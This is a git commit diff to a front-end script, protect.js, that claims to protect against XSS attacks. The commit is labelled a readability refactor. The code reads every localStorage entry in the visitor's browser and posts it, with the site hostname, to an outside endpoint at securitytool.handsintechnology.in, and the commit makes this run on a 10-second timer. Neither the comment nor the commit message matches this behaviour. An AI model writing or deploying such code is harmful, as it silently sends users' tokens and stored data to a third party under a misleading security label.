e0d3d17122ed3322f6aa6fc007925b15ae975fc9
shivam-handsintechnology <shivam@handsintechnology>
2024-06-04 15:04:49 +0530

    chore: Refactor protect.js for improved code structure and readability

--- src/public/protect.js
+++ src/public/protect.js
@@ -1,69 +1,7 @@
-// // Usage: This file is used to protect the application from XSS attacks.
-
-
-
-// async function getAlllocalStorageData() {
-//   const localStorageData = {};
-//   for (let i = 0; i < localStorage.length; i++) {
-//     const key = localStorage.key(i);
-//     const value = localStorage.getItem(key);
-//     localStorageData[key] = value;
-//   }
-//   if (Object.keys(localStorageData).length === 0) {
-//     return null;
-//   }else{
-//    return  localStorageData
-//   }
-// }
-
-
-// // Check if session cookie has expiration
-// // send data to api with xhr request
-//  async function sendToApi(data) {
-//  try {
-
-//   for (const script of document.scripts) {
-//     if (script.src.includes("https://securitytool.handsintechnology.in/api/client/protection")) {
-//         console.log(`URL ${script.src} exists.`);
-//         let appidKeyisExist=script.src.split("?")[1].split("=")[0]
-//         console.log("App Id Key is Exist",appidKeyisExist)
-//         let appid=script.src.split("?")[1].split("=")[1]
-//         if(appidKeyisExist=="appid"){
-//           fetch('https://securitytool.handsintechnology.in/api/client/protection', {
-//             method: 'POST',
-//             headers: {
-//               'Content-Type': 'application/json',
-//             },
-//             body: JSON.stringify({ data:data,appid,hostname:window.location.hostname, }),
-//           }).then((response) => {
-//             if (response.ok) {
-//               console.log('Data sent successfully');
-//             } else {
-//               console.error('Failed to send data');
-//             }
-//           }).catch((error) => {
-//             console.error('Failed to send data', error);
-//           });
-//         }
-//         console.log("App Id",appid)
-//     }else{
-//       console.log("URL not found")
-
-//     }
-// }
-
-//  } catch (error) {
-//   console.log("Error in sending data to api",error)
-//  }
-// }
-
-// setInterval(async()=>{
-//   let data=await getAlllocalStorageData()
-//   if(data!==null){
-//     sendToApi(data)
-//   }
-// },10000)
 // Usage: This file is used to protect the application from XSS attacks.
+
+
+
 async function getAlllocalStorageData() {
   const localStorageData = {};
   for (let i = 0; i < localStorage.length; i++) {
@@ -74,27 +12,29 @@ async function getAlllocalStorageData() {
   if (Object.keys(localStorageData).length === 0) {
     return null;
   } else {
-    return localStorageData;
+    return localStorageData
   }
 }
+
 
 // Check if session cookie has expiration
 // send data to api with xhr request
 async function sendToApi(data) {
   try {
+
     for (const script of document.scripts) {
       if (script.src.includes("https://securitytool.handsintechnology.in/api/client/protection")) {
         console.log(`URL ${script.src} exists.`);
-        let appidKeyisExist = script.src.split("?")[1].split("=")[0];
-        console.log("App Id Key is Exist", appidKeyisExist);
-        let appid = script.src.split("?")[1].split("=")[1];
+        let appidKeyisExist = script.src.split("?")[1].split("=")[0]
+        console.log("App Id Key is Exist", appidKeyisExist)
+        let appid = script.src.split("?")[1].split("=")[1]
         if (appidKeyisExist == "appid") {
           fetch('https://securitytool.handsintechnology.in/api/client/protection', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
             },
-            body: JSON.stringify({ data: data, appid, hostname: window.location.hostname }),
+            body: JSON.stringify({ data: data, appid, hostname: window.location.hostname, }),
           }).then((response) => {
             if (response.ok) {
               console.log('Data sent successfully');
@@ -105,28 +45,25 @@ async function sendToApi(data) {
             console.error('Failed to send data', error);
           });
         }
-        console.log("App Id", appid);
+        console.log("App Id", appid)
       } else {
-        console.log("URL not found");
+        console.log("URL not found")
+
       }
     }
+
   } catch (error) {
-    console.log("Error in sending data to api", error);
+    console.log("Error in sending data to api", error)
   }
 }
 
-// Listen for changes in localStorage
-window.addEventListener('storage', async (event) => {
-  // Check if the event was triggered by a change in localStorage
-  if (event.storageArea === localStorage) {
-    // Get the updated localStorage data
-    const data = await getAlllocalStorageData();
-    if (data !== null) {
-      // Send the data to the API
-      sendToApi(data);
-    }
+setInterval(async () => {
+  let data = await getAlllocalStorageData()
+  if (data !== null) {
+    sendToApi(data)
   }
-});
+}, 10000)
+
 
 
 
